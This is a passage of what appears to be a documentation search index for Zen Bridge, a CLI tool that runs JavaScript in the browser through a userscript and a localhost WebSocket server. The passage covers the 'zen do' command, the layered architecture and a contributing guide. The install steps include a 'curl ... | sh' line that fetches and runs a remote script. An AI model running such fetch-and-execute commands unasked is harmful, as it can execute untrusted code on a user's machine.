--force-ai\n</code></pre> <p>Use when: - Testing AI behavior - Cache is giving wrong results - Want to see AI reasoning</p>"},{"location":"commands/do/#-no-execute","title":"<code>--no-execute</code>","text":"<p>Show matches without executing actions.</p> <pre><code>zen do \"contact\" --no-execute\n</code></pre> <p>Use for: - Preview what would be clicked - Testing action matching - Debugging</p>"},{"location":"commands/do/#-debug","title":"<code>--debug</code>","text":"<p>Show the full AI prompt instead of executing.</p> <pre><code>zen do \"help\" --debug\n</code></pre> <p>Use for: - Understanding what data is sent to AI - Debugging AI responses - Development</p>"},{"location":"commands/do/#examples_1","title":"Examples","text":""},{"location":"commands/do/#basic-navigation","title":"Basic Navigation","text":"<pre><code>zen do \"go home\"           # Navigate to homepage\nzen do \"about page\"        # Go to about page\nzen do \"contact us\"        # Find contact page\nzen do \"pricing\"           # View pricing\n</code></pre>"},{"location":"commands/do/#authentication","title":"Authentication","text":"<pre><code>zen do \"login\"             # Click login button/link\nzen do \"sign in\"           # Same as login\nzen do \"logout\"            # Sign out\nzen do \"register\"          # Sign up\n</code></pre>"},{"location":"commands/do/#search-forms","title":"Search &amp; Forms","text":"<pre><code>zen do \"search\"            # Focus search field\nzen do \"submit form\"       # Submit current form\nzen do \"apply now\"         # Click apply button\n</code></pre>"},{"location":"commands/do/#complex-actions","title":"Complex Actions","text":"<pre><code>zen do \"learn more about their services\"  # Uses AI\nzen do \"I want to contact support\"        # Uses AI\nzen do \"show me the documentation\"        # Uses AI\n</code></pre>"},{"location":"commands/do/#with-options","title":"With Options","text":"<pre><code># Force AI even if cached\nzen do \"about us\" --force-ai\n\n# Preview without executing\nzen do \"checkout\" --no-execute\n\n# Debug mode\nzen do \"complex action\" --debug\n</code></pre>"},{"location":"commands/do/#execution-methods","title":"Execution Methods","text":"<p>The command shows which method was used with indicators:</p> Indicator Method Speed Description <code>[CACHED]</code> Cache \u26a1 Instant Previously used action <code>[LITERAL]</code> Literal \u26a1\u26a1 Very fast Text/URL matching <code>[COMMON]</code> Common \u26a1\u26a1 Very fast Known action pattern <code>[FUZZY]</code> Fuzzy \u26a1\u26a1 Very fast Typo-tolerant matching <code>[SYNONYM]</code> Synonym \u26a1\u26a1 Very fast Synonym expansion <code>[AI]</code> AI \ud83e\udd16 2-5 seconds Natural language understanding"},{"location":"commands/do/#cache-management","title":"Cache Management","text":""},{"location":"commands/do/#cache-location","title":"Cache Location","text":"<p>Cache is stored in: <code>~/.config/zen-bridge/action_cache.db</code> (SQLite)</p>"},{"location":"commands/do/#clear-cache","title":"Clear Cache","text":"<p>To clear the cache, delete the database file:</p> <pre><code>rm ~/.config/zen-bridge/action_cache.db\n</code></pre> <p>Or programmatically (coming soon): <pre><code>zen cache clear\n</code></pre></p>"},{"location":"commands/do/#cache-statistics","title":"Cache Statistics","text":"<p>View cache hit rate and statistics (coming soon): <pre><code>zen cache stats\n</code></pre></p>"},{"location":"commands/do/#tips-best-practices","title":"Tips &amp; Best Practices","text":"<ol> <li>Be concise: \"login\" works better than \"please click the login button\"</li> <li>Use key words: \"pricing plans\" \u2192 just \"pricing\"</li> <li>Let it learn: First time uses AI, second time uses cache</li> <li>Common actions are fast: \"home\", \"login\", \"search\" are instant</li> <li>Exact text matches best: Match link/button text when possible</li> </ol>"},{"location":"commands/do/#troubleshooting","title":"Troubleshooting","text":""},{"location":"commands/do/#action-not-found","title":"Action Not Found","text":"<p>If no match is found: 1. Check page has loaded (<code>zen info</code>) 2. Verify element is visible/clickable 3. Try more specific text 4. Use <code>--debug</code> to see what AI receives</p>"},{"location":"commands/do/#wrong-element-clicked","title":"Wrong Element Clicked","text":"<p>If wrong element is selected: 1. Be more specific in your action 2. Use <code>--force-ai</code> to bypass cache 3. Include context: \"help in footer\" vs just \"help\"</p>"},{"location":"commands/do/#cache-issues","title":"Cache Issues","text":"<p>If cached action is outdated: 1. Wait for TTL expiration (default 24 hours) 2. Clear cache manually 3. Use <code>--force-ai</code> to bypass</p>"},{"location":"commands/do/#slow-performance","title":"Slow Performance","text":"<p>If command is slow: 1. Check if <code>mods</code> is responding (AI fallback) 2. Verify server is running (<code>zen server status</code>) 3. Check network connection 4. Consider disabling cache temporarily</p>"},{"location":"commands/do/#technical-details","title":"Technical Details","text":""},{"location":"commands/do/#page-similarity","title":"Page Similarity","text":"<p>Pages are considered \"similar\" if they match on: - Actionable element count (40% weight) - Heading structure (30% weight) - Landmark structure (30% weight)</p> <p>Default threshold: 80%</p>"},{"location":"commands/do/#action-normalization","title":"Action Normalization","text":"<p>Filler words removed: - Verbs: go, open, click, navigate, visit, show, find, etc. - Articles: the, a, an, to, on, at, in, of, for, etc. - Possessives: my, me, i, want, need - UI types: page, button, link, image, field, form, etc. - Modifiers: please, now, then, next, first, just, only</p>"},{"location":"commands/do/#database-schema","title":"Database Schema","text":"<p>Two tables store cache data:</p> <p>page_cache: - url (primary key) - fingerprint (JSON: element count, headings, landmarks) - last_updated (timestamp) - actionable_elements (JSON array)</p> <p>action_cache: - id (primary key) - url (foreign key) - action_normalized (cleaned action) - action_original (user input) - element_selector (CSS selector) - element_identifier (JSON: type, text, href, context) - success_count (usage tracking) - last_used (timestamp)</p>"},{"location":"commands/do/#see-also","title":"See Also","text":"<ul> <li>zen click - Click elements by CSS selector</li> <li>zen inspect - Inspect page elements</li> <li>zen links - Extract all links from page</li> </ul>"},{"location":"development/architecture/","title":"Architecture","text":"<p>Zen Bridge follows a modern 4-layer architecture with clear separation of concerns, strong type safety, and async-first design principles.</p>"},{"location":"development/architecture/#overview","title":"Overview","text":"<p>Zen Bridge bridges the gap between terminal workflows and browser automation, enabling JavaScript execution in the browser from the command line.</p>"},{"location":"development/architecture/#key-principles","title":"Key Principles","text":"<ol> <li>Layered Architecture - Clean separation between domain, I/O, services, and application</li> <li>Type Safety First - Pydantic models for all data with automatic validation</li> <li>Async by Design - Non-blocking I/O throughout the WebSocket server</li> <li>Single Responsibility - Each module has one clear purpose</li> <li>Testability - Dependency injection and adapter patterns</li> </ol>"},{"location":"development/architecture/#system-architecture","title":"System Architecture","text":"<pre><code>graph TB\n    User[User] --&gt; Terminal[Terminal]\n    User --&gt; Browser[Browser]\n\n    Terminal --&gt; CLI[CLI Commands&lt;br/&gt;33+ commands]\n    Browser --&gt; Userscript[Tampermonkey&lt;br/&gt;Userscript]\n\n    CLI --&gt; AppLayer[Application Layer&lt;br/&gt;CLI + Server]\n    Userscript --&gt; AppLayer\n\n    AppLayer --&gt; Services[Services Layer&lt;br/&gt;Business Logic]\n    Services --&gt; Adapters[Adapters Layer&lt;br/&gt;I/O Operations]\n    Services --&gt; Domain[Domain Layer&lt;br/&gt;Models + Validation]\n    Adapters --&gt; Domain\n\n    style AppLayer fill:#e1f5ff\n    style Services fill:#fff4e1\n    style Adapters fill:#ffe1f5\n    style Domain fill:#e1ffe1</code></pre>"},{"location":"development/architecture/#4-layer-architecture","title":"4-Layer Architecture","text":"<p>Here's a detailed view of how the layers interact:</p> <pre><code>graph TB\n    subgraph Application Layer\n        CLI[CLI Commands]\n        Server[WebSocket Server]\n    end\n\n    subgraph Service Layer\n        BE[BridgeExecutor]\n        AI[AIIntegration]\n        CM[ControlManager]\n        SL[ScriptLoader]\n    end\n\n    subgraph Adapter Layer\n        FS[Filesystem]\n        WS[WebSocket]\n    end\n\n    subgraph Domain Layer\n        Models[Pydantic Models]\n        Validation[Protocol Validation]\n    end\n\n    CLI --&gt; BE\n    CLI --&gt; AI\n    CLI --&gt; CM\n    Server --&gt; SL\n    BE --&gt; WS\n    SL --&gt; FS\n    AI --&gt; FS\n    CM --&gt; WS\n    BE --&gt; Models\n    AI --&gt; Models\n    SL --&gt; Models\n    WS --&gt; Validation\n    FS --&gt; Validation\n\n    style CLI fill:#e1f5ff\n    style Server fill:#e1f5ff\n    style BE fill:#fff4e1\n    style AI fill:#fff4e1\n    style CM fill:#fff4e1\n    style SL fill:#fff4e1\n    style FS fill:#ffe1f5\n    style WS fill:#ffe1f5\n    style Models fill:#e1ffe1\n    style Validation fill:#e1ffe1</code></pre>"},{"location":"development/architecture/#layer-0-domain-core","title":"Layer 0: Domain (Core)","text":"<p>Pure data structures and validation logic - No I/O or external dependencies.</p> <p>Location: <code>zen/domain/</code></p> <p>Components:</p> <ul> <li><code>models.py</code> (398 lines) - Pydantic models for all data structures</li> <li>WebSocket messages (8 types)</li> <li>HTTP API models (7 types)</li> <li>Configuration models (2 types)</li> <li>Helper functions</li> </ul> <p>Example:</p> <pre><code>from zen.domain.models import ExecuteRequest, ExecuteResult\n\n# Create validated request\nrequest = ExecuteRequest(\n    request_id=\"abc-123\",\n    code=\"document.title\"\n)\n\n# Parse incoming message\nresult = ExecuteResult(\n    request_id=\"abc-123\",\n    ok=True,\n    result=\"Example Domain\"\n)\n</code></pre> <p>Properties:</p> <ul> <li>\u2705 No I/O operations</li> <li>\u2705 Pure validation logic</li> <li>\u2705 94.70% test coverage</li> <li>\u2705 Type-safe with Pydantic</li> </ul>"},{"location":"development/architecture/#layer-1-adapters-io","title":"Layer 1: Adapters (I/O)","text":"<p>Abstraction for external systems - Filesystem, network, etc.</p> <p>Location: <code>zen/adapters/</code></p> <p>Components:</p> <ul> <li><code>filesystem.py</code> (176 lines) - File operations</li> <li>Async methods: <code>read_text_async()</code>, <code>write_text_async()</code></li> <li>Sync methods: <code>read_text_sync()</code>, <code>write_text_sync()</code></li> <li>Utilities: <code>file_exists()</code>, <code>dir_exists()</code></li> </ul> <p>Example:</p> <pre><code>from zen.adapters import filesystem\n\n# Async (in server)\ncontent = await filesystem.read_text_async(script_path)\n\n# Sync (in CLI)\nconfig = filesystem.read_text_sync(config_path)\n</code></pre> <p>Benefits:</p> <ul> <li>\u2705 Prevents blocking I/O in async code</li> <li>\u2705 Easy to mock for testing</li> <li>\u2705 Consistent interface</li> </ul>"},{"location":"development/architecture/#layer-2-services-business-logic","title":"Layer 2: Services (Business Logic)","text":"<p>Orchestration and business logic - Coordinates between layers.</p> <p>Location: <code>zen/services/</code></p> <p>Components:</p> <ol> <li>ScriptLoader (207 lines)</li> <li>Load JavaScript files from <code>zen/scripts/</code></li> <li>In-memory caching</li> <li>Template substitution</li> <li> <p>Sync &amp; async interfaces</p> </li> <li> <p>BridgeExecutor (263 lines)</p> </li> <li>Standardized code execution</li> <li>Retry logic with exponential backoff</li> <li>Error handling</li> <li> <p>Version checking</p> </li> <li> <p>AIIntegration (367 lines)</p> </li> <li>Language detection</li> <li>Prompt loading and formatting</li> <li> <p>Integration with 'mods' AI tool</p> </li> <li> <p>ControlManager (230 lines)</p> </li> <li>Control mode state tracking</li> <li>Notification polling</li> <li>Accessibility announcements (TTS)</li> </ol> <p>Service Interactions:</p> <pre><code>graph TD\n    CLI[CLI Command]\n    BE[BridgeExecutor]\n    SL[ScriptLoader]\n    AI[AIIntegration]\n    CM[ControlManager]\n    Client[HTTP Client]\n    FS[Filesystem]\n\n    CLI --&gt; BE\n    CLI --&gt; AI\n    CLI --&gt; CM\n    BE --&gt; Client\n    BE --&gt; SL\n    AI --&gt; SL\n    AI --&gt; BE\n    CM --&gt; Client\n    SL --&gt; FS\n\n    style CLI fill:#e1f5ff\n    style BE fill:#fff4e1\n    style SL fill:#fff4e1\n    style AI fill:#fff4e1\n    style CM fill:#fff4e1\n    style Client fill:#ffe1f5\n    style FS fill:#ffe1f5</code></pre> <p>Example:</p> <pre><code>from zen.services.bridge_executor import get_executor\n\nexecutor = get_executor()\nresult = executor.execute(\n    \"document.title\",\n    timeout=10.0,\n    retry_on_timeout=True\n)\n</code></pre>"},{"location":"development/architecture/#layer-3-application","title":"Layer 3: Application","text":"<p>User-facing interfaces - CLI and WebSocket server.</p> <p>Location: <code>zen/app/</code></p> <p>Components:</p> <p>CLI Modules (12 modules, 4,220 lines):</p> Module Commands Purpose <code>exec.py</code> eval, exec, repl JavaScript execution <code>extraction.py</code> extract-* Data extraction <code>inspection.py</code> info, inspect Page inspection <code>interaction.py</code> click, type Element interaction <code>navigation.py</code> open, back Navigation <code>server.py</code> server Server management <code>watch.py</code> watch Event monitoring <code>cookies.py</code> cookies Cookie management <p>WebSocket Server (<code>bridge_ws.py</code>, 396 lines):</p> <ul> <li>HTTP endpoints: <code>/run</code>, <code>/result</code>, <code>/health</code>, <code>/notifications</code></li> <li>WebSocket handler: <code>/ws</code></li> <li>Request/response state management</li> </ul>"},{"location":"development/architecture/#data-flow","title":"Data Flow","text":""},{"location":"development/architecture/#command-execution-flow","title":"Command Execution Flow","text":"<pre><code>sequenceDiagram\n    participant User\n    participant CLI\n    participant Service\n    participant Client\n    participant Server\n    participant Browser\n\n    User-&gt;&gt;CLI: zen eval \"document.title\"\n    CLI-&gt;&gt;Service: executor.execute()\n    Service-&gt;&gt;Client: client.execute()\n    Client-&gt;&gt;Server: POST /run\n    Server-&gt;&gt;Browser: WebSocket: execute\n    Browser-&gt;&gt;Browser: eval()\n    Browser-&gt;&gt;Server: WebSocket: result\n    Server-&gt;&gt;Client: result available\n    Client-&gt;&gt;Service: return result\n    Service-&gt;&gt;CLI: return result\n    CLI-&gt;&gt;User: Output</code></pre> <p>Timing (typical):</p> <ul> <li>CLI \u2192 Server: ~1-5ms</li> <li>Server \u2192 Browser: ~1-5ms</li> <li>Browser eval: 1-100ms (depends on code)</li> <li>Total: 5-120ms end-to-end</li> </ul>"},{"location":"development/architecture/#script-loading-flow","title":"Script Loading Flow","text":"<pre><code>graph LR\n    CLI[CLI Command] --&gt; Loader[ScriptLoader]\n    Loader --&gt; Cache{In Cache?}\n    Cache --&gt;|Yes| Return[Return Cached]\n    Cache --&gt;|No| FS[Filesystem Adapter]\n    FS --&gt; Store[Store in Cache]\n    Store --&gt; Return\n\n    style CLI fill:#e1f5ff\n    style Loader fill:#fff4e1\n    style Cache fill:#fff9e6\n    style FS fill:#ffe1f5\n    style Store fill:#fff4e1\n    style Return fill:#e1ffe1</code></pre> <p>Performance:</p> <ul> <li>First load: ~50ms (disk I/O)</li> <li>Cached: ~0.1ms (memory)</li> <li>Result: 50-100ms saved per command</li> </ul>"},{"location":"development/architecture/#websocket-communication-flow","title":"WebSocket Communication Flow","text":"<pre><code>sequenceDiagram\n    participant U as User\n    participant C as CLI\n    participant H as HTTP API\n    participant W as WebSocket\n    participant B as Browser\n\n    U-&gt;&gt;C: zen eval \"code\"\n    C-&gt;&gt;H: POST /run {code}\n    H-&gt;&gt;W: Store request\n    W-&gt;&gt;B: Send execute message\n    B-&gt;&gt;B: Evaluate JavaScript\n    B-&gt;&gt;W: Send result message\n    W-&gt;&gt;H: Store result\n    C-&gt;&gt;H: GET /result/{id}\n    H-&gt;&gt;C: Return result\n    C-&gt;&gt;U: Display output\n\n    Note over C,H: Polling with timeout\n    Note over W,B: WebSocket connection\n    Note over B: Runs in active tab</code></pre>"},{"location":"development/architecture/#extension-points","title":"Extension Points","text":""},{"location":"development/architecture/#adding-a-new-cli-command","title":"Adding a New CLI Command","text":"<ol> <li>Choose/create module in <code>zen/app/cli/</code></li> <li>Define command:</li> </ol> <pre><code>import click\nfrom zen.services.bridge_executor import get_executor\n\n@click.command()\n@click.argument(\"selector\")\ndef my_command(selector):\n    \"\"\"My awesome command.\"\"\"\n    executor = get_executor()\n\n    # Execute JavaScript\n    result = executor.execute(\n        f\"document.querySelector('{selector}').textContent\"\n    )\n\n    click.echo(result[\"result\"])\n</code></pre> <ol> <li>Register in main CLI (<code>zen/app/cli/__init__.py</code>)</li> </ol>"},{"location":"development/architecture/#adding-a-new-service","title":"Adding a New Service","text":"<ol> <li>Create service class in <code>zen/services/</code></li> <li>Implement singleton pattern:</li> </ol> <pre><code>from __future__ import annotations\n\nclass MyService:\n    def __init__(self):\n        pass\n\n    def do_something(self, input: str) -&gt; str:\n        return f\"Processed: {input}\"\n\n_default_service: MyService | None = None\n\ndef get_my_service() -&gt; MyService:\n    global _default_service\n    if _default_service is None:\n        _default_service = MyService()\n    return _default_service\n</code></pre>"},{"location":"development/architecture/#extending-the-protocol","title":"Extending the Protocol","text":"<ol> <li>Add Pydantic model in <code>zen/domain/models.py</code>:</li> </ol> <pre><code>class MyNewMessage(BaseModel):\n    type: Literal[\"my_new_message\"] = \"my_new_message\"\n    data: str\n    timestamp: float\n</code></pre> <ol> <li>Update parser:</li> </ol> <pre><code>def parse_incoming_message(data: dict[str, Any]) -&gt; IncomingMessage:\n    if data.get(\"type\") == \"my_new_message\":\n        return MyNewMessage(**data)\n    # ...\n</code></pre> <ol> <li>Handle in server (<code>bridge_ws.py</code>)</li> </ol>"},{"location":"development/architecture/#design-patterns","title":"Design Patterns","text":""},{"location":"development/architecture/#service-layer-pattern","title":"Service Layer Pattern","text":"<p>Services coordinate business logic between adapters and application:</p> <pre><code>class BridgeExecutor:\n    def execute(self, code: str, timeout: float) -&gt; dict:\n        # 1. Check server\n        self.ensure_server_running()\n\n        # 2. Execute with retry\n        for attempt in range(self.max_retries):\n            result = self.client.execute(code, timeout)\n            if result[\"ok\"]:\n                return result\n\n        # 3. Handle failure\n        raise ExecutionError()\n</code></pre>"},{"location":"development/architecture/#adapter-pattern","title":"Adapter Pattern","text":"<p>Adapters abstract I/O operations for testability:</p> <pre><code># Production\ncontent = await filesystem.read_text_async(path)\n\n# Testing\n@pytest.fixture\ndef mock_filesystem(monkeypatch):\n    async def mock_read(path):\n        return \"mocked content\"\n    monkeypatch.setattr(filesystem, \"read_text_async\", mock_read)\n</code></pre>"},{"location":"development/architecture/#singleton-pattern","title":"Singleton Pattern","text":"<p>Share expensive resources across commands:</p> <pre><code>_default_executor: BridgeExecutor | None = None\n\ndef get_executor() -&gt; BridgeExecutor:\n    global _default_executor\n    if _default_executor is None:\n        _default_executor = BridgeExecutor()\n    return _default_executor\n</code></pre>"},{"location":"development/architecture/#repository-pattern","title":"Repository Pattern","text":"<p>Centralize script access with caching:</p> <pre><code>loader = ScriptLoader()\nscript = loader.load_script_sync(\"control.js\")  # Cached automatically\n</code></pre>"},{"location":"development/architecture/#module-dependencies","title":"Module Dependencies","text":"<pre><code>graph TD\n    App[Application Layer] --&gt; Services[Services Layer]\n    Services --&gt; Adapters[Adapters Layer]\n    Services --&gt; Domain[Domain Layer]\n    Adapters --&gt; Domain\n\n    App -.-&gt;|\u274c Never| Domain\n    Services -.-&gt;|\u274c Never| App\n    Adapters -.-&gt;|\u274c Never| Services\n    Adapters -.-&gt;|\u274c Never| App\n    Domain -.-&gt;|\u274c Never| Any[Any Layer]\n\n    style Domain fill:#e1ffe1\n    style Adapters fill:#ffe1f5\n    style Services fill:#fff4e1\n    style App fill:#e1f5ff</code></pre> <p>Rules:</p> <ul> <li>\u2705 Higher layers import lower layers</li> <li>\u274c Lower layers never import higher</li> <li>\u2705 No circular dependencies</li> <li>\ud83d\udccb To be enforced with ruff (Phase 3)</li> </ul>"},{"location":"development/architecture/#configuration","title":"Configuration","text":""},{"location":"development/architecture/#hierarchy-highest-to-lowest-priority","title":"Hierarchy (highest to lowest priority)","text":"<ol> <li>CLI flags - <code>--timeout 30</code></li> <li>Environment variables - <code>export ZEN_TIMEOUT=30</code> (planned)</li> <li>Local config - <code>./config.json</code></li> <li>User config - <code>~/.zen/config.json</code></li> <li>Defaults - <code>zen/config.py:DEFAULT_CONFIG</code></li> </ol>"},{"location":"development/architecture/#configuration-model","title":"Configuration Model","text":"<pre><code>class ZenConfig(BaseModel):\n    ai_language: str = \"auto\"\n    control: ControlConfig = Field(default_factory=ControlConfig)\n</code></pre> <p>Example config:</p> <pre><code>{\n  \"ai-language\": \"nl\",\n  \"control\": {\n    \"auto-refocus\": \"always\",\n    \"speak-all\": true,\n    \"verbose\": true,\n    \"focus-color\": \"#ff6600\"\n  }\n}\n</code></pre>"},{"location":"development/architecture/#performance","title":"Performance","text":""},{"location":"development/architecture/#metrics","title":"Metrics","text":"<ul> <li>Command latency: 5-120ms (typical)</li> <li>Script cache hit: ~0.1ms (vs ~50ms disk)</li> <li>Event loop: Non-blocking (async I/O throughout)</li> </ul>"},{"location":"development/architecture/#optimizations","title":"Optimizations","text":"<ol> <li>Script caching - In-memory cache for frequently used scripts</li> <li>Singleton services - Reuse HTTP clients and connections</li> <li>Async I/O - Non-blocking file operations in server</li> <li>Connection pooling - Reuse WebSocket connections</li> </ol>"},{"location":"development/architecture/#security","title":"Security","text":"<p>Localhost Only</p> <p>Server binds to <code>127.0.0.1</code> only. Never bind to <code>0.0.0.0</code> or public IPs.</p>"},{"location":"development/architecture/#security-model","title":"Security Model","text":"<ul> <li>Localhost-only: All communication on loopback interface</li> <li>No authentication: Trust model for local development</li> <li>User must trust scripts: Arbitrary JavaScript execution by design</li> <li>Browser sandbox: Relies on browser security boundaries</li> </ul> <p>See Security Guide for detailed threat model.</p>"},{"location":"development/architecture/#technology-stack","title":"Technology Stack","text":""},{"location":"development/architecture/#core","title":"Core","text":"<ul> <li>Python 3.11+ - Modern async/await</li> <li>Click 8.1+ - CLI framework</li> <li>aiohttp 3.9+ - Async HTTP/WebSocket</li> <li>Pydantic 2.5+ - Data validation</li> <li>aiofiles 23.2+ - Async file I/O</li> </ul>"},{"location":"development/architecture/#development","title":"Development","text":"<ul> <li>pytest - Testing framework</li> <li>mypy - Static type checking</li> <li>ruff - Fast linting and formatting</li> <li>pre-commit - Git hooks</li> </ul>"},{"location":"development/architecture/#browser","title":"Browser","text":"<ul> <li>WebSocket API - Bidirectional communication</li> <li>Tampermonkey/Violentmonkey - Userscript injection</li> <li>JavaScript ES6+ - Client-side execution</li> </ul>"},{"location":"development/architecture/#project-metrics","title":"Project Metrics","text":"<p>Code Metrics (Phase 0-2):</p> <ul> <li>Total Python: ~5,550 lines</li> <li>Main modules: 23 files</li> <li>Test coverage: 11.83% (target: 80%+)</li> <li>Type coverage: 100% on new code</li> <li>Tests: 52 passing</li> </ul> <p>CI/CD:</p> <ul> <li>Python 3.11, 3.12, 3.13</li> <li>Lint, typecheck, test on push</li> <li>Pre-commit hooks</li> </ul>"},{"location":"development/architecture/#next-steps","title":"Next Steps","text":"<ul> <li>Contributing Guide - Development workflow</li> <li>Testing Guide - Test strategy</li> <li>Security Guide - Security model</li> </ul>"},{"location":"development/architecture/#references","title":"References","text":"<p>For additional technical documentation, see the project repository root files: - <code>ARCHITECTURE.md</code> - Complete architecture documentation - <code>REFACTOR_PLAN.md</code> - Refactoring progress and phases - <code>PROTOCOL.md</code> - WebSocket protocol specification</p>"},{"location":"development/contributing/","title":"Contributing Guide","text":"<p>Thank you for your interest in contributing to Zen Bridge! This guide will help you get started with development and make your first contribution.</p>"},{"location":"development/contributing/#quick-start","title":"Quick Start","text":""},{"location":"development/contributing/#prerequisites","title":"Prerequisites","text":"<ul> <li>Python 3.11+ (Python 3.11, 3.12, or 3.13)</li> <li>Git for version control</li> <li>Modern browser (Chrome, Firefox, Edge)</li> <li>Tampermonkey or Violentmonkey extension</li> </ul>"},{"location":"development/contributing/#installation","title":"Installation","text":"Using uv (Recommended)Using pip + venvUsing poetry <pre><code># Install uv (fast Python package installer)\ncurl -LsSf https://astral.sh/uv/install.sh | sh\n\n# Clone repository\ngit clone https://github.com/roelvangils/zen-bridge.git\ncd zen-bridge\n\n# Create virtual environment and install\nuv venv\nsource .venv/bin/activate  # On Windows: .venv\\Scripts\\activate\nuv pip install -e \".[dev]\"\n\n# Install pre-commit hooks\npre-commit install\n</code></pre> <pre><code># Clone repository\ngit clone https://github.com/roelvangils/zen-bridge.git\ncd zen-bridge\n\n# Create virtual environment\npython3 -m venv .venv\nsource .venv/bin/activate\n\n# Install in development mode\npip install -e \".[dev]\"\n\n# Install pre-commit hooks (if available)\npre-commit install\n</code></pre> <pre><code># Clone repository\ngit clone https://github.com/roelvangils/zen-bridge.git\ncd zen-bridge\n\n# Install dependencies\npoetry install\n\n# Activate shell\npoetry shell\n</code></pre>"},{"location":"development/contributing/#verify-installation","title":"Verify Installation","text":"<pre><code># Check version\nzen --version\n\n# Check all dependencies installed\npython -c \"import zen; print(zen.__version__)\"\n</code></pre>"},{"location":"development/contributing/#development-setup","title":"Development Setup","text":""},{"location":"development/contributing/#1-start-the-bridge-server","title":"1. Start the Bridge Server","text":"<p>In one terminal:</p> <pre><code>zen server start\n</code></pre> <p>Expected output:</p> <pre><code>Zen Bridge WebSocket Server (aiohttp)\nWebSocket: ws://127.0.0.1:8766/ws\nHTTP API: http://127.0.0.1:8765\n\n\u2713 Loaded control.js into cache (36766 bytes)\n\nHTTP server running on http://127.0.0.1:8765\nWebSocket server running on ws://127.0.0.1:8766/ws\nReady for connections!\n</code></pre>"},{"location":"development/contributing/#2-install-userscript","title":"2. Install Userscript","text":"<ol> <li>Install Tampermonkey extension</li> <li>Open <code>userscript_ws.js</code> in the project</li> <li>Copy entire file contents</li> <li>Open Tampermonkey dashboard</li> <li>Click \"Create a new script\"</li> <li>Paste contents and save</li> <li>Open any website (e.g., https://example.com)</li> <li>Check console: <code>[Zen Bridge] Connected via WebSocket</code></li> </ol>"},{"location":"development/contributing/#3-test-basic-commands","title":"3. Test Basic Commands","text":"<pre><code># Test evaluation\nzen eval \"document.title\"\n\n# Test data extraction\nzen extract-links\n\n# Test control mode\nzen control start\nzen control next\nzen control click\n</code></pre>"},{"location":"development/contributing/#development-workflow","title":"Development Workflow","text":""},{"location":"development/contributing/#1-create-a-branch","title":"1. Create a Branch","text":"<pre><code># Feature branch\ngit checkout -b feature/my-awesome-feature\n\n# Bug fix branch\ngit checkout -b fix/issue-123\n\n# Documentation\ngit checkout -b docs/improve-readme\n</code></pre> <p>Branch naming:</p> <ul> <li><code>feature/description</code> - New features</li> <li><code>fix/description</code> - Bug fixes</li> <li><code>docs/description</code> - Documentation</li> <li><code>refactor/description</code> - Code refactoring</li> <li><code>test/description</code> - Test additions</li> </ul>"},{"location":"development/contributing/#2-make-changes","title":"2. Make Changes","text":"<p>Edit relevant files:</p> <ul> <li><code>zen/app/cli/</code> - CLI commands</li> <li><code>zen/services/</code> - Business logic</li> <li><code>zen/adapters/</code> - I/O operations</li> <li><code>zen/domain/</code> - Data models</li> <li><code>zen/bridge_ws.py</code> - WebSocket server</li> <li><code>zen/scripts/</code> - JavaScript files</li> </ul>"},{"location":"development/contributing/#3-run-tests","title":"3. Run Tests","text":"<pre><code># Run all tests\npytest\n\n# Run with coverage\npytest --cov=zen\n\n# Run specific test file\npytest tests/unit/test_models.py\n\n# Run with verbose output\npytest -v\n</code></pre>"},{"location":"development/contributing/#4-check-code-quality","title":"4. Check Code Quality","text":"<pre><code># Format code\nruff format zen/\n\n# Check linting\nruff check zen/\n\n# Auto-fix issues\nruff check zen/ --fix\n\n# Type checking\nmypy zen/\n</code></pre>"},{"location":"development/contributing/#5-commit-changes","title":"5. Commit Changes","text":"<p>Follow Conventional Commits:</p> <pre><code>git add .\ngit commit -m \"feat(cli): add new extract-cookies command\"\n</code></pre> <p>Commit types:</p> <ul> <li><code>feat</code>: New feature</li> <li><code>fix</code>: Bug fix</li> <li><code>docs</code>: Documentation</li> <li><code>style</code>: Code style (no logic change)</li> <li><code>refactor</code>: Code refactoring</li> <li><code>test</code>: Add/modify tests</li> <li><code>chore</code>: Maintenance</li> <li><code>perf</code>: Performance improvement</li> </ul>"},{"location":"development/contributing/#6-push-and-create-pr","title":"6. Push and Create PR","text":"<pre><code># Push to your fork\ngit push origin feature/my-awesome-feature\n\n# Create pull request on GitHub\n</code></pre>"},{"location":"development/contributing/#code-style-standards","title":"Code Style &amp; Standards","text":""},{"location":"development/contributing/#python-style","title":"Python Style","text":"<p>We use ruff for linting and formatting.</p> <p>Style guidelines:</p> <ul> <li>Line length: 100 characters</li> <li>Indentation: 4 spaces</li> <li>String quotes: Double quotes preferred</li> <li>Imports: Sorted, grouped (stdlib, third-party, local)</li> </ul> <p>Example:</p> <pre><code>\"\"\"Module docstring.\"\"\"\n\nfrom __future__ import annotations\n\nimport json\nfrom pathlib import Path\nfrom typing import Any\n\nimport click\nfrom pydantic import BaseModel\n\nfrom zen.services.bridge_executor import get_executor\n\n\ndef my_function(arg: str, timeout: float = 10.0) -&gt; dict[str, Any]:\n    \"\"\"Do something useful.\n\n    Args:\n        arg: Description\n        timeout: Maximum time in seconds\n\n    Returns:\n        Dictionary with result\n\n    Raises:\n        ValueError: If arg is invalid\n    \"\"\"\n    if not arg:\n        raise ValueError(\"arg is required\")\n\n    return {\"result\": arg, \"timeout\": timeout}\n</code></pre>"},{"location":"development/contributing/#type-hints","title":"Type Hints","text":"<p>All functions must have type hints:</p> <pre><code># \u2705 Good\ndef get_title(url: str, timeout: float = 10.0) -&gt; str:\n    \"\"\"Get page title.\"\"\"\n    ...\n\n# \u274c Bad\ndef get_title(url, timeout=10.0):\n    ...\n</code></pre> <p>Run type checker:</p> <pre><code>mypy zen/ --strict\n</code></pre>"},{"location":"development/contributing/#docstrings","title":"Docstrings","text":"<p>Use Google-style docstrings:</p> <pre><code>def execute_script(script_path: Path, timeout: float) -&gt; dict[str, Any]:\n    \"\"\"Execute a JavaScript file in the browser.\n\n    Args:\n        script_path: Path to JavaScript file\n        timeout: Maximum execution time in seconds\n\n    Returns:\n        Dictionary with execution result:\n            - ok (bool): Whether execution succeeded\n            - result (Any): Return value from JavaScript\n            - error (str | None): Error message if failed\n\n    Raises:\n        ConnectionError: If bridge server is not running\n        TimeoutError: If execution exceeds timeout\n        FileNotFoundError: If script file does not exist\n\n    Example:\n        &gt;&gt;&gt; result = execute_script(Path(\"script.js\"), 10.0)\n        &gt;&gt;&gt; if result[\"ok\"]:\n        ...     print(result[\"result\"])\n    \"\"\"\n    ...\n</code></pre>"},{"location":"development/contributing/#javascript-style","title":"JavaScript Style","text":"<p>For scripts in <code>zen/scripts/</code>:</p> <pre><code>/**\n * Description of what this script does.\n * @returns {Object} Result object with data\n 